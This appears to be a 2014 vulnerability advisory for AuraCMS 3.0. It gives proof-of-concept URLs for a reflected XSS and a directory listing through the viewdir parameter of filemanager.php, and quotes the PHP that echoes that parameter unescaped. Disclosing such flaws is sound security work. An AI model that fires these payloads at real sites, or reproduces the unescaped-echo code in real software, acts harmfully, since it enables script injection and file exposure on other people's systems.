# Date: 05/28/2014
# Author: Mustafa ALTINKAYNAK
# Download URL :http://auracms.org/
# Software Link: http://codeload.github.com/auracms/AuraCMS/zip/master
# Vuln Category: CWE-79 (XSS) - CWE-98 (LFI)
# Tested on: AuraCMS 3.0
# Tested Local Platform : XAMP on Windows 8
# Patch/ Fix: Not published.
---------------------------
  
Technical Details
---------------------------
1) Reflected XSS : FileManager is a parameter unfiltered view of the file. 
Ex: filemanager.php?viewdir="><script>alert(&#039;Mustafa&#039;);</script>
 
2) LFI (Local File Include) : Directory listing is done. 
Ex : filemanager.php?viewdir=/home
 
---------------------------------------------------------------------------------
# filemanager.php (Between 263,311 line)
Example : domain.com/auracms/filemanager.php?viewdir=request
280 line : <input type="hidden" value="<?php echo $_GET[&#039;viewdir&#039;]; ?>" name="return" />
 
Example 2 : domain.com/auracms/filemanager.php?viewdir="><script>alert("mustafa");</script>
<input type="hidden" value="<script>alert("mustafa");</script>" name="return" />
 
Example 3 : domain.com/auracms/filemanager.php?viewdir=<script>alert("mustafa");</script>
<input type="hidden" value=" "><script>alert("mustafa");</script>" name="return" /> Bingooo :)
 
<?php
if(isset($_GET[&#039;viewdir&#039;])) {
?>
        <ul id="browser-toolbar">
            <li class="file-new"><a href="#" title="<?php echo $lng[&#039;new_file_title&#039;]; ?>" onclick="toggle_visibility(&#039;load-file&#039;); return false;"><?php echo $lng[&#039;new_file&#039;]; ?></a></li>
            <li class="folder-new"><a href="#" title="<?php echo $lng[&#039;new_folder_title&#039;]; ?>" onclick="create_folder(&#039;<?php echo $_GET[&#039;viewdir&#039;]; ?>&#039;); return false;"><?php echo $lng[&#039;new_folder&#039;]; ?></a></li>
            <li class="folder-delete"><a href="#" title="<?php echo $lng[&#039;delete_folder_title&#039;]; ?>" onclick="delete_folder(&#039;<?php echo $_GET[&#039;viewdir&#039;]; ?>&#039;);"><?php echo $lng[&#039;delete_folder&#039;]; ?></a></li>
            <li class="file-refresh"><a href="#" title="<?php echo $lng[&#039;refresh_files_title&#039;]; ?>" onclick="load(&#039;filemanager.php?viewdir=<?php echo $_GET[&#039;viewdir&#039;]; ?>&#039;,&#039;view-files&#039;); return false;"><?php echo $lng[&#039;refresh&#039;]; ?></a></li>
        </ul>
         
        <div id="current-loction">
          <?php echo htmlspecialchars($root_path . &#039;/&#039; . $_GET[&#039;viewdir&#039;] . &#039;/&#039;); ?>
        </div>
         
        <form style="display: none;" id="load-file" action="" class="load-file" method="post" enctype="multipart/form-data">
 
            <fieldset>
              <legend><?php echo $lng[&#039;new_file_title&#039;]; ?></legend>
                <input type="hidden" value="<?php echo $_GET[&#039;viewdir&#039;]; ?>" name="return" />
                <label><?php echo $lng[&#039;form_file&#039;]; ?><input type="file" name="new_file" /></label>
            </fieldset>
             
            <fieldset>
              <legend><?php echo $lng[&#039;new_file_manipulations&#039;]; ?></legend>
              <table>
                    <tr>
                        <td><label for="new_resize"><?php echo $lng[&#039;form_width&#039;]; ?></label></td>
                        <td><input type="text" class="number" maxlength="4" id="new_resize" name="new_resize" value="" /> px</td>
                    </tr>
                    <tr>
                        <td><label for="new_rotate"><?php echo $lng[&#039;form_rotate&#039;]; ?></label></td>
                        <td>
                            <select id="new_rotate" name="new_rotate">
                              <option value="0"></option>
                              <option value="90">90</option>
                              <option value="180">180</option>
                              <option value="270">270</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td></td>
                        <td><input type="checkbox" class="checkbox" id="new_greyscale" name="new_greyscale" /><label for="new_greyscale"><?php echo $lng[&#039;form_greyscale&#039;]; ?></label></td>
                    </tr>
              </table>
            </fieldset>
             
            <input type="submit" id="insert" value="<?php echo $lng[&#039;form_submit&#039;]; ?>" />
             
        </form>
<?php } ?>
-----------

